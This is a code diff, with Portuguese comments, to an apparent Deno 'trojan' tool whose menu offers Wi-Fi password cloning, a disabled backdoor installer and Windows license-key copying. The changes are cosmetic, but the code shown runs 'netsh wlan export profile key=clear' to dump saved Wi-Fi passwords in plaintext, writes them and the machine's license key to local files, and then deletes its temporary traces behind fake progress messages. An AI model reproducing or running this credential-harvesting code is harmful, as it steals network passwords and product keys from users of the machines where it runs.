@@ -1,4 +1,4 @@
-import { TerminalSpinner } from '@spinners';
+import { TerminalSpinner, SpinnerTypes } from '@spinners';
 import { Select } from '@cliffy/select';
 import colors from '@colors';
 import { delay } from '@std';
@@ -19,7 +19,7 @@ async function menu() {
 	const input: string = await Select.prompt({
 		message: 'Escolha uma ferramenta:',
 		options: [
-			{ name: '- Injetar Trojan:WiFiCloner', value: '1' },
+			{ name: '- Injetar Trojan:Wi-FiCloner', value: '1' },
 			{ name: '- Instalar Backdoor', value: '2', disabled: true },
 			{ name: '- Copiar chave de ativação', value: '3' },
 			// Select.separator('--------'),
@@ -53,6 +53,7 @@ async function menu() {
 
 	// Voltando ao menu inicial
 	setTimeout(() => menu(), 5_000);
+	return;
 }
 
 async function NetSHProfileCollector() {
@@ -75,10 +76,10 @@ async function NetSHProfileCollector() {
 
 	const spinner = new Spinner('Clonando redes Wi-Fi...');
 
-	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários
+	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
 		.catch(() => {});
 
-	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas
+	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
 		.catch(() => {});
 
 	// Chamando a API do Windows
@@ -86,16 +87,17 @@ async function NetSHProfileCollector() {
 		'netsh wlan export profile key=clear folder=.tempdata',
 	);
 
+	// Fiz um counter manual pois o readDir retorna um Iterable<Deno.DirEntry>
+	// e eu não quis quebrar a cabeça com algo tão fútil quanto pegar o length disso
 	let counter = 0;
 
 	// Por padrão, A API fornece as informações em arquivos XML bem poluídos
 	// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
-	for (const file of Deno.readDirSync('.tempdata')) {
-		if (file.isDirectory) continue; // Pular pastas
+	for await (const file of Deno.readDir('.tempdata')) {
 		counter++;
 
 		// Lendo conteúdo do arquivo
-		const content = Deno.readTextFileSync(`.tempdata/${file.name}`);
+		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
 
 		// Filtrando tags que são úteis
 		const name = clearTags(content.match(/<name>.*?<\/name>/));
@@ -117,7 +119,6 @@ async function NetSHProfileCollector() {
 
 	await delay(1_000);
 	await clearTraces(); // Limpar registros
-
 	return;
 }
 
@@ -135,13 +136,14 @@ async function copyWinKey() {
 		`Chave de ativação obtida:\n\n${key}`,
 	);
 
-	Deno.mkdir('WindowsKeys') //
+	Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
 		.catch(() => {});
 
 	Deno.writeTextFileSync(
 		`WindowsKeys/${Deno.hostname()}.txt`,
 		`Machine: ${Deno.hostname()}\nWindows License Key: ${key}`,
 	);
+	return;
 }
 
 async function clearTraces() {
@@ -151,7 +153,7 @@ async function clearTraces() {
 	await delay(1_500);
 
 	Deno.remove('.tempdata', { recursive: true })
-		// 'recursive' significa que é pra apagar mesmo se tiver pastas e arquivos dentro
+		// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 		.then(() => status.end('Registros excluídos.'))
 		.catch(() => status.fail('Nada para excluir.'));
 	return;
@@ -162,8 +164,9 @@ async function executeCommand(cmd: string) {
 		cmd: cmd.split(' '),
 		stdout: 'piped',
 		stderr: 'piped',
-	});
+	}); // Executa o comando
 
+	// Decodifica o retorno do processo
 	const res = new TextDecoder()
 		.decode(await process.output());
 
@@ -174,9 +177,9 @@ async function executeCommand(cmd: string) {
 
 async function createFakeStatus(loadingMsg: string, completeMsg: string) {
 	const status = new Spinner(loadingMsg, currentMenu);
+
 	await delay(random());
 	status.end(completeMsg);
-
 	return;
 }
 
@@ -187,7 +190,7 @@ function clearTags(text: RegExpMatchArray | string | null) {
 }
 
 function random() {
-	// Retorna um número aleatório até 2000
+	// Retorna um número aleatório menor que 3000 e maior que 500
 	const value = Math.floor(Math.random() * 3_000);
 	return value < 500 ? value + 1_000 : value;
 }
@@ -200,26 +203,15 @@ class Spinner {
 	constructor(text: string, sector?: string) {
 		this.sector = sector || currentMenu;
 		this.text = text;
+
 		// Inicia Spinner
 		this.spinner = new TerminalSpinner({
 			text: this._format(),
 			spinner: {
 				interval: 40,
-				frames: [
-					'⠋',
-					'⠙',
-					'⠹',
-					'⠸',
-					'⠼',
-					'⠴',
-					'⠦',
-					'⠧',
-					'⠇',
-					'⠏',
-				],
+				frames: SpinnerTypes.dots.frames,
 			},
 			indent: 1,
-			cursor: true,
 			color: 'cyan',
 		}).start();
 	}
@@ -240,7 +232,7 @@ class Spinner {
 			? '0' + date.getMinutes()
 			: date.getMinutes();
 
-		return [ // isso pode parecer meio confuso
+		return [ // Modelo de string
 			'[',
 			this.sector.toUpperCase().cyan, // [ SECTOR
 			'|',
